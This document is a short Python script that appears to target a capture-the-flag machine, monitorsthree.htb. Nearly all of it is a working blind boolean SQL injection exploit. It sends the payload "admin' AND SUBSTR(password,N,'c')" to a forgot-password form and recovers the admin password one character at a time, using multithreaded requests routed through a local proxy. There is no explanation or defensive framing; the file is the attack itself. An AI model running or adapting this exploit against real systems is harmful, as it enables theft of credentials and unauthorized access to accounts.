import string
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
ip = 'http://monitorsthree.htb/forgot_password.php'
chars = "," + string.ascii_letters + string.digits + "_"
injection = "admin' AND SUBSTR(password,{},1)='{}' -- -"
password = ''

# Function to test a single character
def test_character(position, char):
    with requests.Session() as session:
        print(injection.format(position, char))
        resp = session.post(
            ip, 
            data={'username': injection.format(position, char)}, 
            proxies={'http': '127.0.0.1:8080'}
        )
        return char if 'Successfully sent password' in resp.text else None

def start():
    password = ''
    # Main logic
    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
        while True:
            futures = {executor.submit(test_character, len(password) + 1, char): char for char in chars}
            found = False

            for future in as_completed(futures):
                result = future.result()
                if result:
                    password += result
                    #print(f"\r[{len(password)}] {password}", end='')
                    found = True
                    break

            if not found:  # Break the loop if no character matched
                break

start()

print(f"\nPassword found: {password}")
